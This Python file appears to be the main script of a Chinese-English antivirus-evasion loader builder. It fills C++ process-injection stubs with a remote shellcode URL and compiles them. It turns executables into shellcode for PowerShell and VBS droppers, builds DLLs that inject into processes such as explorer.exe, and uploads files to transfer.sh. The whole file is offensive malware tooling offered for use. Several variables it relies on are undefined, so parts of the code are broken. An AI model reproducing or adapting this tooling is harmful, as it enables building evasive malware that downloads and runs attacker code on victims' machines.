import base64
import os
import random
import string
import subprocess
from time import sleep

from tkinter import *
from tkinter import filedialog
import Resource.StringPainting
from colorama import Fore
import Stub.Encryptor



class DAZZLINGCOLORS:
    OKPINK = '\033[95m'       # pink
    OKBLUE = '\033[94m'       # blue
    OKGREEN = '\033[92m'      # green
    OKYELLOW = '\033[93m'      # yellow
    OKRED = '\033[91m'         # red
    OKBLACK = '\033[0m'          # black
    BLACKBOLD = '\033[1m'          # black+bold
    UNDERLINE = '\033[4m'     # black+underline





Cpp_injection_mode_options = DAZZLINGCOLORS.OKPINK + """
                                                      
Injection Mode:
+----------+----+--------------------------+--------+--- +           
|1.QueueUserAPC                                          |   
*                                                        *   
|2.RemoteThreadContext                                   |    
*                                                        *   
|3.RemoteThreadSuspended                                 |
*                                                        *
|4.CurrentThread                                         |   
+----------+----+--------------------------+--------+----+\n
"""


Option_stub = Resource.StringPainting.DynamicPainting.DynaminString()  + """
 bilibli:我不是格林
 Github:https://github.com/INotGreen/GlllPowerLoader
 
\033[1;36m 1.免杀加载器(\033[1;33mLoader Bypass AntiVirus\033[0m)
\033[1;36m 2.文件格式转换(\033[1;33mFile Format Conversion\033[0m)
\033[1;36m 3.Dll生成器(\033[1;33mDynamic link library generation\033[0m)
\033[1;36m 4.文件托管(\033[1;33m File Bundle\033[0m)
"""


with open('Stub/powershell_to_vbs.ps1', 'r',encoding='utf-8') as powershell_to_vbs:
        powershell_to_vbs = powershell_to_vbs.read()  
with open('Stub/CurrentThread.cpp', 'r',encoding='utf-8') as CurrentThread:
        CurrentThread = CurrentThread.read()  
with open('Stub/APC_Injection.cpp', 'r',encoding='utf-8') as APC_Injection:
        APC_Injection = APC_Injection.read()  
with open('Stub/RemoteThreadContext.cpp', 'r',encoding='utf-8') as RemoteThreadContext:
        RemoteThreadContext = RemoteThreadContext.read()
with open('Stub/RemoteThreadSuspended.cpp', 'r',encoding='utf-8') as RemoteThreadSuspended:
        RemoteThreadSuspended = RemoteThreadSuspended.read()          

INOTGREEN = Fore.GREEN+ "<GREEN>:"



class other_commands:
    sheshell_commandl = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]
    back_command = ["back", "BACK","show",""]
    
    def Shell_Command(self):
        try:
            result = os.popen("powershell " + self)
            
            context = result.read()
            #print(context)
        except:
            print("wrong input")
        return context
    


def ReadFilePath(type):
    filetype = '.'+ str(type)
    my_filetypes = [('all files', filetype)]
    answer = filedialog.askopenfilename(initialdir=os.getcwd(),title="请选择一个文件:",filetypes=my_filetypes)
    (file, ext) = os.path.splitext(answer)
    (path, filename) = os.path.split(answer) 
    filedialog.__cached__    
    return answer


def randomcolor():
    randomcolor = random.choice(Resource.StringPainting.Colors.ColorCollect())
    return randomcolor


def randomstring(num):
    return ''.join(random.sample(string.ascii_letters + string.digits, num))

def other_command(Optionsargs):
    if Optionsargs in other_commands.sheshell_commandl:
        print(Option_stub)
    if Optionsargs in other_commands.back_command:
        print(Option_stub)
    else:
        print(other_commands.Shell_Command(Optionsargs))
        other_options = input(INOTGREEN)
        while True:
            if other_options not in other_commands.sheshell_commandl and other_options not in other_commands.tools_commands:
                print(other_commands.Shell_Command(other_options))
                other_options = input(INOTGREEN)
                if other_options in other_commands.back_command:
                    print(Option_stub)
                    break
            else:
                print(Option_stub)
                break



def GetDesktopPath():
    return os.path.join(os.path.expanduser("~"), 'Desktop')


def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspended,CurrentThread,verbose):
    # print(stub)
    print(Option_stub)
    while True:
        Options = input(INOTGREEN)
        if Options == "1":  # 1.免杀加载器
            while True:
                # print()
                print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK + 
                      "\nPlease select shellcode loader:\n"
                      "+----------+----+--------------------------+--------+ \n"
                      "|                                                   | \n"
                      "|1.C/C++ Syscall Multi-stage loading                | \n"
                      "|                                                   | \n"
                      "+----------+----+--------------------------+--------+ \n")
                                
                Bypass_choice = input(INOTGREEN)
                if Bypass_choice == "back" or Bypass_choice == "BACK":
                    print(Option_stub)
                    break
                if Bypass_choice == "1":  # C/C++系统调用加载器
                    print(Cpp_injection_mode_options)
                    Inject_Module = input(DAZZLINGCOLORS.OKGREEN + "Please select process injection mode:\n"+INOTGREEN)
                    
                    print("\n")
                    #file = input(DAZZLINGCOLORS.OKGREEN + "请输入raw格式的文件:\n" +INOTGREEN)
                    
                 
                    URL = input(DAZZLINGCOLORS.OKGREEN +"\n(enter the URL of bin)\n"+INOTGREEN)
                    
                    outfile = "%USERPROFILE%\Desktop\\Green.exe"
                    try:
                        if os.path.exists(outfile):
                            os.system("""del "{0}"\n""".format(outfile))
                        
                       
                        elif Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
                            APC_Injection = APC_Injection.replace("URLREPLACE",URL)
                            stub = open("Stub\\stub.cpp", "w")
                            stub.write(APC_Injection)
                            stub.close()
                            os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
                        elif Inject_Module in ["2", "RemoteThreadContext", "remotethreadcontext"]:
                           RemoteThreadContext = RemoteThreadContext.replace("URLREPLACE",URL)
                           stub = open("Stub\\stub.cpp", "w")
                           stub.write(RemoteThreadContext)
                           stub.close()
                        elif Inject_Module in ["3", "RemoteThreadSuspended", "remoteThreadsuspended"]:
                           RemoteThreadSuspended = RemoteThreadSuspended.replace("URLREPLACE",URL)
                           stub = open("Stub\\stub.cpp", "w")
                           stub.write(RemoteThreadSuspended)
                           stub.close()
                        elif Inject_Module in ["4", "CurrentThread", "currentthread"]:
                            CurrentThread_stub = CurrentThread.replace("URLREPLACE",URL)
                            stub = open("Stub\\stub.cpp", "w")
                            stub.write(CurrentThread_stub)
                            stub.close()
                            
                        os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
                        if os.path.exists("a.exe"):
                            print(randomcolor()+"[+] Generated successfully!")
                        else:{
                            print(randomcolor()+"[!] Generated failed")
                        }
                        os.system("del Stub\\stub.cpp")
                        
                        break
                    except:
                        continue
                

                if Bypass_choice in other_commands.back_command:
                    print(Option_stub)
                    
                    break
                        
        
        if Options == "2":  # 2.文件格式转换
            while True:
                print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK +"\n"
                      "+----------+----+--------------------------+\n"
                      "| 1.ps1_to_vbs(stage)                      |\n"
                      "*                                          *\n"
                      "| 3.C#_to_ps1                             |\n"
                      "*                                          *\n"
                      "| 5.ps1_to_vbs(stageless)                  |\n"
                      "+----------+----+--------------------------+\n")
                                
                formatopions = input(DAZZLINGCOLORS.OKGREEN + INOTGREEN)
                if formatopions not in other_commands.sheshell_commandl:
                    other_commands.Shell_Command(formatopions)
                if formatopions == "1":  #1.ps1_to_vbs(stage) 
                    url = input(DAZZLINGCOLORS.OKGREEN +"+----------+----+-------------+------------+\n""Input URL:\n\n" + INOTGREEN)
                    PowerShell_stub = PowerShell_stub.replace("GREEN", url)
                    # print(PowerShell_stub)
                    #PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")
                    #stub = stub.replace("REPLACED", PowerShell_stubEncryption)
                    print(DAZZLINGCOLORS.OKGREEN + "[+] Enable verbose messages")
                    if os.path.exists("Green.vbs"):
                        os.system("del Green.vbs")
                        
                    writefile = open("stubps1tovbs.ps1", "w")
                    writefile.write(PowerShell_stub)
                    writefile.close()
                    Ps1ToVbs = open("Ps1ToVbs.ps1", "w")
                    Ps1ToVbs.write(powershell_to_vbs)
                    Ps1ToVbs.close()
                    sleep(1)
                    print(DAZZLINGCOLORS.OKGREEN+ "[+] Save New stub to stubps1tovbs.ps1")
                    sleep(1)
                    outfile = GetDesktopPath() + "\\Green.vbs"
                    os.system("powershell .\Ps1ToVbs.ps1")
                    if os.path.exists("Green.vbs"):
                        os.system("""copy Green.vbs "{0}" && del Green.vbs""".format(outfile))
                    if os.path.exists(outfile) == True:
                        print(DAZZLINGCOLORS.OKPINK +"[!] Compile Successfully")
                    else:
                        print(DAZZLINGCOLORS.OKPINK +"[!] Compilation failed")
                    os.system("del Ps1ToVbs.ps1")
                    os.system("del stubps1tovbs.ps1")
                    break
                
                
                
    
                    print("请选择你的文件(Select your file)")
                    FilePath = ReadFilePath("exe")
                    print(FilePath)
                    if os.path.exists("payload.bin"):
                        os.system("del payload.bin")
                    try:
                        os.system("""Resource\donut.exe -f "{0}" -o payload.bin""".format(FilePath))
                        exe2base64encode("payload.bin")
                        #print(DAZZLINGCOLORS.OKRED + "[+]payload generated successfully--->payload.bin")
                        break
                    except:
                        continue
                if formatopions == "3":  #3.C#_to_ps1 
                    print("请选择你的文件(Select your file)\n" + INOTGREEN)
                    FilePath = ReadFilePath("exe")
                    if os.path.exists("payload.bin"):
                        os.system("del payload.bin")
                    try:
                        os.system("""Resource\donut.exe -f "{0}" -o payload.bin""".format(FilePath))
                        sleep(1)
                        
                        #if os.path.exists("payload.bin")==True:
                        with open("payload.bin", 'rb') as stub:
                            save = stub.read()
                        base64context = str(base64.b64encode(save),'utf-8')                     
                        powershell_payload = powershell_payload.replace('REPLACE_SHELLCODE', base64context)
                        outfile = GetDesktopPath() + "\\payload.ps1"
                        file = open(outfile, 'w')
                        file.write(powershell_payload)
                        file.close()                                                       
                        if os.path.exists("payload.ps1"):                            
                            print(DAZZLINGCOLORS.OKGREEN + "[+] payload.ps1 generated successfully!")
                            
                        else:
                            
                            print(DAZZLINGCOLORS.OKGREEN + "[!] payload.ps1 build failed!")                        
                        break
                        
                    except:
                        continue
                 
   
            
                
                if formatopions == "7":  #7.ps1_to_vbs(stageless)
                    FilePath = ReadFilePath("ps1")
                    with open(FilePath, 'r',encoding='utf-8') as files:
                        text = files.read()
                    print("[+] Enable verbose messages")
                    if os.path.exists("Green.vbs"):
                        os.system("del Green.vbs")    
                    writefile = open("stubps1tovbs.ps1", "w")
                    writefile.write(text)
                    writefile.close()    
                    
                    Ps1ToVbs = open("Ps1ToVbs.ps1", "w")
                    Ps1ToVbs.write(powershell_to_vbs)
                    Ps1ToVbs.close()
                    sleep(1)
                    print("[+] Save New stub to stubps1tovbs.ps1")
                    sleep(1)
                    os.system("powershell .\Ps1ToVbs.ps1")
                    if os.path.exists("Green.vbs"):
                        os.system("""copy Green.vbs "{0}" && del Green.vbs &&del stubps1tovbs.ps1&& del Ps1ToVbs.ps1""".format(outfile))
                    if os.path.exists(outfile) == True:
                        print(DAZZLINGCOLORS.OKPINK +"[!] Compile Successfully")
                    else:
                        print(DAZZLINGCOLORS.OKPINK +"[!] Compilation failed")
                    break
                    
                        
                    
                    
                if formatopions == "back" or formatopions == "BACK" or formatopions == None:
                    print(Option_stub)
                    break
                if formatopions not in other_commands.sheshell_commandl:
                    other_commands.Shell_Command(formatopions)

        if Options == "3":  # 3.持久化
                    print(Cpp_injection_mode_options)
                    Inject_Module = input(DAZZLINGCOLORS.OKGREEN + "Please enter process injection mode:\n" + INOTGREEN)
                    print("\n")
                    print(DAZZLINGCOLORS.OKGREEN + "Please select the file in raw format:\n<INETGREEN>:")
                    filepath = ReadFilePath('bin')
                    print(filepath)
                    
                    
                    print("\n")
                    print(DAZZLINGCOLORS.OKPINK + 
                        "+----------+----+--------------------------+--------+\n"
                        "|1.notepad.exe              2.explorer.exe          |\n"
                        "|3.rundll32.exe             4.Schtasks.exe          |\n"
                        "|5.Regsvr32.exe             6.Wmic.exe              |\n"
                        "|7.OneDrive.exe                                     |\n"
                        "+----------+----+--------------------------+--------+\n")
                    inject_option = input(DAZZLINGCOLORS.OKGREEN + "\n Please select the process to inject\n"+ INOTGREEN)
                    
                    outfile = "%USERPROFILE%\Desktop\\"+ input(DAZZLINGCOLORS.OKGREEN + "\n output file name(*.dll)\n" + INOTGREEN)
                    print(outfile)
                    
                    if inject_option == "1":
                        inject_option = "notepad.exe"
                    if inject_option == "2":
                        inject_option = "explorer.exe"
                    if inject_option == "3":
                        inject_option = "rundll32.exe"
                    if inject_option == "4":
                        inject_option = "Schtasks.exe"
                    if inject_option == "5":
                        inject_option = "Regsvr32.exe"
                    if inject_option == "6":
                        inject_option = "Wmic.exe"
                    if inject_option == "7":
                        inject_option = "OneDrive.exe"
                    
                   
                        
                    if Inject_Module in ["1", "processhollow"]:
                        os.system(
                            """python Stub\\Cpp_loader.py "{0}" -m processhollow -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
                    elif Inject_Module in ["2", "QueueUserAPC", "queueUserapc"]:
                        os.system(
                            """python Stub\\Cpp_loader.py "{0}"  -m queueUserapc -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
                    elif Inject_Module in ["3", "RemoteThreadContext", "remotethreadcontext"]:
                        os.system(
                            """python Stub\\Cpp_loader.py "{0}"  -m remotethreadcontext -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
                    elif Inject_Module in ["4", "RemoteThreadSuspended", "remoteThreadsuspended"]:
                        os.system(
                            """python Stub\\Cpp_loader.py "{0}" -p {1} -m remoteThreadsuspended -d -o "{2}"\n""".format(filepath, inject_option,outfile))
                    elif Inject_Module in ["5", "CurrentThread", "currentthread"]:
                        os.system(
                            """python Stub\\Cpp_loader.py "{0}" -m currentthread -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
                    
                    print("\n")
                    os.system("del stub.cpp")
        if Options == "4":
                print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK)
                print(Resource.StringPainting.DynamicPainting.DynaminString())


                my_filetypes = [('all files', '.*'), ('text files', '.txt')]
                answer = filedialog.askopenfilename(initialdir=os.getcwd(), title="请选择一个文件:", filetypes=my_filetypes) 
                if answer:
                    (file, ext) = os.path.splitext(answer)
                    (path, filename) = os.path.split(answer)
                    print(filename)

                try:
                    # 使用安全的方式构建和执行命令
                    command = ["curl", "--upload-file", answer, f"https://transfer.sh/{filename}"]
                    result = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = result.communicate()
                    context = stdout.decode()

                    for line in context.splitlines():
                        print(randomcolor() + "\n\n\n" + "文件下载链接:" + line.replace(".sh/", ".sh/get/") + "\n\n\n")
                except Exception as e:
                    print("发生错误:", e)
                    

      
        if Options not in other_commands.sheshell_commandl:
            print(Option_stub)
            other_command(Options)
                    
                        
main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspended,CurrentThread,verbose=True)